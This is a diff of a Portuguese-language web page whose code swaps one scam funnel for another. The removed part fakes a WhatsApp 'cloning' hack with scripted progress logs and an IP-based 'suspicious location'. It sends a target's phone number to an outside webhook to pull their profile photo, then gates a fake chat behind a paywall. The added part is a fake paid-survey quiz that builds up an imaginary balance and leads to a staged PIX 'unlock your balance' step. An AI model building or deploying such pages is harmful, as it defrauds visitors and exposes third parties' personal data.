+    if(!captchaValido()){ alert('Marque o captcha "Não sou um robô" para continuar.'); return; }
+    email = e;
+    atualizarSaldoChip();
+    carregarArtista();
   }
-}
-window.addEventListener('hashchange', ()=>showPage(location.hash));
-showPage(location.hash);
 
-/* ===== pílula 29,97 ===== */
-document.getElementById('upgradePill').addEventListener('click', ()=>{
-  if(UPGRADE_URL && UPGRADE_URL.trim()){
-    window.open(UPGRADE_URL, '_blank');
-  }else{
-    showPaywall();
+  function showTwoLeft(){
+    if(!twoLeftPopup) return;
+    twoLeftPopup.style.display = 'block';
+    // some após 5 segundos
+    setTimeout(()=>{ twoLeftPopup.style.display = 'none'; }, 5000);
   }
-});
 
-/* ===== “Acessar relatório” (abre a #chat por padrão) ===== */
-const REPORT_URL = ""; // opcional
-accessReportBtn.addEventListener('click', ()=>{
-  if(REPORT_URL && REPORT_URL.trim()){
-    window.open(REPORT_URL, '_blank');
-  }else{
-    location.hash = 'chat';
-  }
-});
+  function carregarArtista(){
+    // quando faltarem 2 artistas, mostra popup
+    const restantes = artistas.length - atual;
+    if(restantes === 2){ showTwoLeft(); }
 
-/* ===== fluxo de coleta → loading → perfil (mantido) ===== */
-cloneButton.addEventListener('click', ()=>{
-  const phone = phoneInput.value.trim();
-  if(!phone) return;
-  localStorage.setItem('numeroClonado', phone);
-  stepCollect.style.display = 'none';
-  stepLoading.style.display = 'block';
-  stepLoading.setAttribute('aria-hidden','false');
-  startLoadingFlow();
-});
-
-const logMessages = [
-  { text: 'Iniciando conexão com servidores WhatsApp...', delay: 800 },
-  { text: 'Localizando servidor mais próximo...', delay: 1800 },
-  { text: 'Servidor localizado! Estabelecendo conexão segura...', delay: 3200 },
-  { text: 'Verificando número de telefone...', delay: 4800 },
-  { text: 'Número de telefone válido!', delay: 6400 },
-  { text: 'Analisando base de dados...', delay: 8200 },
-  { text: 'Buscando informações de perfil...', delay: 10000 },
-  { text: 'Detectando localização do dispositivo...', delay: 11800, isLocation:true },
-  { text: 'Preparando canal privado de leitura...', delay: 16000 },
-  { text: 'Canal privado estabelecido!', delay: 17800 },
-  { text: 'Sincronizando mensagens...', delay: 19800 },
-  { text: 'Sincronização completa!', delay: 21800 },
-  { text: 'Acesso concedido com sucesso!', delay: 23800 }
-];
-
-function addLogLine(text){
-  const node = document.createElement('div');
-  node.className = 'log-line';
-  node.textContent = text;
-  logContainer.appendChild(node);
-  logContainer.scrollTop = logContainer.scrollHeight;
-  setTimeout(()=>node.classList.add('visible'),50);
-}
-function setProgress(p){
-  progressFill.style.width = p+'%';
-  progressText.textContent = `Conectando aos servidores... ${p}%`;
-}
-
-function startLoadingFlow(){
-  logContainer.innerHTML = '';
-  profileCard.classList.remove('visible');
-  imgProfile.src = 'https://i.postimg.cc/gcNd6QBM/img1.jpg';
-  numeroPerfil.textContent = localStorage.getItem('numeroClonado') || '(XX) XXXXX-XXXX';
-  userCityElement.textContent = 'Carregando...';
-  confirmBar.style.display = 'none';
-  setProgress(2);
-
-  logMessages.forEach(msg=>{
-    setTimeout(async ()=>{
-      if(msg.isLocation){
-        try{
-          const res = await fetch('https://wtfismyip.com/json');
-          const data = await res.json();
-          const userCity = data.YourFuckingCity || data.city || 'Fortaleza';
-          const userCountry = data.YourFuckingCountry || data.country || 'Brasil';
-          addLogLine(`Localização suspeita encontrada em ${userCity}, ${userCountry}`);
-          userCityElement.textContent = userCity;
-        }catch(e){
-          addLogLine('Não foi possível detectar localização precisa');
-          userCityElement.textContent = 'Fortaleza';
-        }
-      }else addLogLine(msg.text);
-    }, msg.delay);
-  });
-
-  let progress = 2;
-  const int = setInterval(()=>{
-    progress = Math.min(100, progress + Math.ceil(Math.random()*3));
-    setProgress(progress);
-    if(progress>=100){
-      clearInterval(int);
-      setTimeout(()=>{
-        profileCard.classList.add('visible');
-        const numeroApi = getNumeroApi(localStorage.getItem('numeroClonado')||'');
-        iniciarBuscaComConfirmacao(numeroApi);
-      }, 900);
+    if(atual >= artistas.length){
+      finalAmount.textContent = brl(total);
+      congratsModal.style.display = 'flex';
+      // no final a barra fica CHEIA
+      progressBar.style.width = '100%';
+      return;
     }
-  }, 250);
-}
-
-/* ===== buscar perfil / diagnóstico (mantidos) ===== */
-async function fetchProfileOnce(candidate){
-  const url = "https://w.imagens.pics/webhook/182dd";
-  const key = "wuAsuKHImXennBSFjt895tu984ut5";
-  let foto = null, statusTxt = '', errorDetail = null;
-  try{
-    addLogLine(`Consultando perfil (${candidate}) via POST...`);
-    const resp = await fetchWithTimeout(url, {
-      method:'POST',
-      headers:{"Content-Type":"application/json","key":key},
-      body:JSON.stringify({ number:candidate })
-    }, 12000);
-    if(resp.ok){
-      const data = await resp.json();
-      foto = data.foto || data.photo || null;
-      statusTxt = data.Status || data.status || '';
-      if(foto) return { ok:true, foto, statusTxt };
-      errorDetail = 'POST ok, mas sem foto';
-    }else errorDetail = `POST ${resp.status}`;
-  }catch(e){ errorDetail = 'POST falhou'; }
-
-  try{
-    addLogLine(`Tentando via GET (fallback) para ${candidate}...`);
-    const u = `${url}?number=${encodeURIComponent(candidate)}&key=${encodeURIComponent(key)}`;
-    const resp2 = await fetchWithTimeout(u, {method:'GET'}, 12000);
-    if(resp2.ok){
-      const data2 = await resp2.json();
-      foto = data2.foto || data2.photo || null;
-      statusTxt = data2.Status || data2.status || '';
-      if(foto) return { ok:true, foto, statusTxt };
-      errorDetail = 'GET ok, mas sem foto';
-    }else errorDetail = `GET ${resp2.status}`;
-  }catch(e2){ errorDetail = 'GET falhou'; }
-
-  return { ok:false, foto:null, statusTxt:'', errorDetail };
-}
-async function diagnosticarWebhook(numero){
-  const url = "https://w.imagens.pics/webhook/182dd";
-  const key = "wuAsuKHImXennBSFjt895tu984ut5";
-  async function tryOnce(n, mode){
-    if(mode==='POST'){
-      return await fetchWithTimeout(url,{
-        method:'POST',headers:{"Content-Type":"application/json","key":key},
-        body:JSON.stringify({number:n})
-      },8000);
-    }else{
-      const u = `${url}?number=${encodeURIComponent(n)}&key=${encodeURIComponent(key)}`;
-      return await fetchWithTimeout(u,{method:'GET'},8000);
-    }
-  }
-  let result = { reached:false, connected:false, code:null };
-  for (const mode of ['POST','GET']){
-    try{
-      const resp = await tryOnce(numero, mode);
-      result.code = resp.status;
-      if(resp.ok){
-        result.reached = true;
-        const data = await resp.json().catch(()=>null);
-        const statusStr = (data && (data.status || data.Status)) ? String(data.status || data.Status).toLowerCase() : '';
-        const hasFoto = !!(data && (data.foto || data.photo));
-        result.connected = hasFoto || /connect|online|session|ok|success/.test(statusStr);
-        return result;
-      }
-    }catch(e){}
-  }
-  return result;
-}
-async function iniciarBuscaComConfirmacao(numeroApi){
-  const { preferred, alt, hasAlt } = resolveCandidatesForInteractive(numeroApi);
-
-  const res1 = await fetchProfileOnce(preferred);
-
-  numeroPerfil.textContent = formatarNumeroBrasil(localStorage.getItem('numeroClonado')||'');
-  if(res1.ok){
-    imgProfile.src = res1.foto;
-    localStorage.setItem('fotoperfil', res1.foto);
-    localStorage.setItem('Status', res1.statusTxt||'');
-    addLogLine('Perfil carregado com sucesso!');
-  }else{
-    imgProfile.src = 'https://i.postimg.cc/gcNd6QBM/img1.jpg';
-    addLogLine('Não foi possível obter a foto do perfil.');
-    if(res1.errorDetail) addLogLine(`Detalhe: ${res1.errorDetail}`);
+    const a = artistas[atual];
+    quiz.innerHTML = `
+      <h3 style="color:#13a64a">Responda e ganhe ${brl(a.valor)}</h3>
+      <img class="main-img" src="${a.imagem}" alt="${a.nome}">
+      <div class="question">De 1 a 5, que nota você daria para as músicas de ${a.nome}?</div>
+      <div class="options">
+        ${[1,2,3,4,5].map(n=>`<label><input type="radio" name="nota" value="${n}">${n}</label>`).join('')}
+      </div>
+      <div class="question">Recomendaria ${a.nome}?</div>
+      <div class="options">
+        <label><input type="radio" name="reco" value="sim">Sim</label>
+        <label><input type="radio" name="reco" value="nao">Não</label>
+      </div>
+      <div class="question">Faixa etária:</div>
+      <div class="options">
+        <label><input type="radio" name="idade" value="-18">-18</label>
+        <label><input type="radio" name="idade" value="+18">+18</label>
+      </div>
+      <button class="btn" onclick="proxima()">Enviar respostas</button>
+    `;
   }
 
-  try{
-    const diag = await diagnosticarWebhook(numeroApi);
-    if(!diag.reached) addLogLine('Diagnóstico: webhook não respondeu.');
-    else if(diag.connected) addLogLine('Diagnóstico: webhook ativo e há sinais de sessão WhatsApp conectada.');
-    else addLogLine(`Diagnóstico: webhook respondeu ${diag.code}, mas sem sinais claros de sessão ativa.`);
-  }catch(e){ addLogLine('Diagnóstico: erro inesperado.'); }
-
-  if(hasAlt){
-    const altLocalLen = alt.replace(/^55/,'').length;
-    btnNo.textContent = (altLocalLen===10) ? 'Não, tentar sem 9' : 'Não, tentar com 9';
-    confirmText.textContent = res1.ok ? 'É essa pessoa?' : 'Não encontramos foto com este formato. Tentar outra variação?';
-    confirmBar.style.display = 'flex';
-
-    btnYes.onclick = ()=>{
-      confirmBar.style.display = 'none';
-      btnYes.onclick = btnNo.onclick = null;
-    };
-    btnNo.onclick = async ()=>{
-      btnNo.disabled = btnYes.disabled = true;
-      addLogLine('Refazendo busca com a outra variação do número...');
-      const res2 = await fetchProfileOnce(alt);
-      if(res2.ok){
-        imgProfile.src = res2.foto;
-        localStorage.setItem('fotoperfil', res2.foto);
-        localStorage.setItem('Status', res2.statusTxt||'');
-        addLogLine('Novo perfil carregado com sucesso!');
-      }else{
-        addLogLine('Também não foi possível obter a foto nesta variação.');
-        if(res2.errorDetail) addLogLine(`Detalhe: ${res2.errorDetail}`);
-      }
-      confirmBar.style.display = 'none';
-      btnNo.disabled = btnYes.disabled = false;
-      btnYes.onclick = btnNo.onclick = null;
-    };
-  }else{
-    confirmBar.style.display = 'none';
+  function proxima(){
+    const ganho = artistas[atual].valor;
+    total += ganho;
+    atualizarSaldoChip();
+    try{ som.currentTime = 0; som.play(); }catch(e){}
+    // popup de ganho
+    gainValue.textContent = brl(ganho);
+    gainOverlay.style.display = 'flex';
+    setTimeout(()=>{
+      gainOverlay.style.display = 'none';
+      // progresso parcial (visual)
+      const pct = Math.min(100, Math.round((total / totalPossible) * 100));
+      progressBar.style.width = pct + '%';
+      atual++;
+      carregarArtista();
+    }, 1200);
   }
-}
 
-/* ===== toast a cada 6s ===== */
-setInterval(()=>{
-  if(location.hash !== '#chat') return;
-  toast.classList.add('show');
-  setTimeout(()=>toast.classList.remove('show'), 1800);
-}, 15000);
+  // ===== TELA DE SAQUE (PIX simulado) =====
+  function goToWithdraw(){
+    congratsModal.style.display = 'none';
+    quiz.innerHTML = `
+      <div class="saldo-box">
+        <div class="saldo-label">Seu saldo</div>
+        <div class="saldo-valor">${brl(total)}</div>
+      </div>
 
-/* ======== CHAT VIVO (lista) ======== */
-const MSG_TEMPLATES = [
-  "Oi, tá por aí?","Me chama rapidinho ","Enviei o vídeo 📹",
-  "vem que dia agora?","Viu minha mensagem?","Cheguei agora 😉",
-  "Beleza, combinado!","Ok!"
-];
-function nowHHMM(){
-  const d=new Date(); const h=String(d.getHours()).padStart(2,'0'); const m=String(d.getMinutes()).padStart(2,'0'); return `${h}:${m}`;
-}
-function playDing(){
-  try{ msgSound.currentTime = 0; msgSound.play().catch(()=>{}); }catch(e){}
-}
-function bumpToTop(item){
-  if(!item || !chatListEl) return;
-  chatListEl.removeChild(item);
-  chatListEl.insertBefore(item, chatListEl.firstElementChild);
-}
-function simulateIncoming(){
-  if(location.hash !== '#chat') return;
-  const items = Array.from(chatListEl.querySelectorAll('.row-chat'));
-  if(!items.length) return;
-  const item = items[Math.floor(Math.random()*items.length)];
-  const prev = item.querySelector('.preview');
-  const time = item.querySelector('.time');
-  const badge = item.querySelector('.badge');
+      <div class="muted" style="margin:6px 0 10px">Selecione seu tipo de chave PIX</div>
 
-  if(prev) prev.textContent = MSG_TEMPLATES[Math.floor(Math.random()*MSG_TEMPLATES.length)];
-  if(time) time.textContent = nowHHMM();
-  if(badge){ badge.textContent = String(parseInt(badge.textContent||'0',10)+1); }
+      <div class="pix-types">
+        <div class="pix-card" id="tipo-cpf" onclick="selectTipo('cpf')">
+          <img src="cpf.png" alt="CPF / CNPJ"><p>CPF / CNPJ</p>
+        </div>
+        <div class="pix-card" id="tipo-tel" onclick="selectTipo('tel')">
+          <img src="tel.png" alt="Telefone"><p>Telefone</p>
+        </div>
+        <div class="pix-card" id="tipo-email" onclick="selectTipo('email')">
+          <img src="email.png" alt="E-mail"><p>E-mail</p>
+        </div>
+        <div class="pix-card" id="tipo-ale" onclick="selectTipo('ale')">
+          <img src="aleatoria.png" alt="Aleatória"><p>Aleatória</p>
+        </div>
+      </div>
 
-  bumpToTop(item);
-  playDing();
-}
-setInterval(simulateIncoming, 10000);
+      <input class="input" id="campoPix" placeholder="Digite sua chave PIX aqui">
+      <input class="input" id="campoValor" placeholder="Digite o valor que deseja sacar" value="${brl(total)}">
 
-/* ===== Paywall (gatilho em qualquer função) ===== */
-function showPaywall(){ payModal.classList.add('show'); }
-function hidePaywall(){ payModal.classList.remove('show'); }
-btnLater.addEventListener('click', hidePaywall);
-payModal.addEventListener('click', (e)=>{ if(e.target===payModal) hidePaywall(); });
-btnUnlockNow.addEventListener('click', ()=>{
-  if(UPGRADE_URL && UPGRADE_URL.trim()){
-    window.open(UPGRADE_URL, '_blank');
+      <button class="btn" onclick="submitWithdraw()">PIX VIA RAPIDP</button>
+    `;
   }
-  hidePaywall();
-});
-/* Evento delegado: qualquer clique em elemento “gate” / ações / bottom nav / chats / busca / FAB */
-document.getElementById('page-chat').addEventListener('click', (e)=>{
-  if(e.target.closest('#upgradePill')) return;   // pílula tem ação própria
-  const gate = e.target.closest('.gate');
-  if(!gate) return;
-  e.preventDefault();
-  e.stopPropagation();
-  showPaywall();
-});
 
-/* ===== iniciar preenchido se já tiver número ===== */
-document.addEventListener('DOMContentLoaded', ()=>{
-  const saved = localStorage.getItem('numeroClonado');
-  if(saved){
-    phoneInput.value = maskBrPhone(saved);
-    cloneButton.removeAttribute('disabled');
+  let tipoSelecionado = null;
+  function selectTipo(tipo){
+    tipoSelecionado = tipo;
+    document.querySelectorAll('.pix-card').forEach(c=>c.classList.remove('active'));
+    document.getElementById('tipo-'+tipo).classList.add('active');
+    const campo = document.getElementById('campoPix');
+    if(!campo) return;
+    if(tipo==='cpf') campo.placeholder = 'Digite sua chave PIX aqui (CPF/CNPJ)';
+    if(tipo==='tel') campo.placeholder = 'Digite sua chave PIX aqui (Telefone)';
+    if(tipo==='email') campo.placeholder = 'Digite sua chave PIX aqui (E-mail)';
+    if(tipo==='ale') campo.placeholder = 'Digite sua chave PIX aqui (Aleatória)';
   }
-  if(location.hash==="#chat"){
-    const fp = localStorage.getItem('fotoperfil');
-    chatTopAvatar.src = fp || chatTopAvatar.src;
-    scheduleFirstKick();
+
+  // Enviar (SIMULADO) -> abre popup com animação 🔒 -> ✅ e botão para próxima página
+  function submitWithdraw(){
+    const chave = (document.getElementById('campoPix')||{}).value?.trim() || '';
+    const valor = (document.getElementById('campoValor')||{}).value?.trim() || '';
+    if(!tipoSelecionado){ alert('Selecione o tipo de chave PIX.'); return; }
+    if(!chave){ alert('Digite sua chave PIX (simulado).'); return; }
+    if(!valor){ alert('Digite o valor do saque (simulado).'); return; }
+
+    // Mostra popup com animação: cadeado -> check
+    const popup = document.getElementById('popup');
+    const stage = document.getElementById('emojiStage');
+    const title = document.getElementById('popupTitle');
+    const text = document.getElementById('popupText');
+    const btn  = document.getElementById('popupBtn');
+
+    // estado inicial
+    stage.textContent = '🔒';
+    stage.classList.remove('emoji-ok');
+    title.textContent = 'DESBLOQUEAR SEU SALDO';
+    text.textContent  = 'Usamos uma verificação anti-fraude para garantir sua segurança.';
+    btn.textContent   = 'CONTINUAR';
+
+    popup.style.display = 'flex';
+
+    // anima "desbloqueio" -> check
+    setTimeout(()=>{ stage.classList.add('pop'); }, 120);
+    setTimeout(()=>{
+      stage.classList.remove('pop');
+      stage.textContent = '✅';
+      stage.classList.add('emoji-ok');
+      title.textContent = 'Saldo validado!';
+      text.textContent  = 'Validação concluída com sucesso. Clique para continuar.';
+      btn.textContent   = 'Desbloquear Saque';
+    }, 4200);
   }
-});
 </script>
 </body>
 </html>
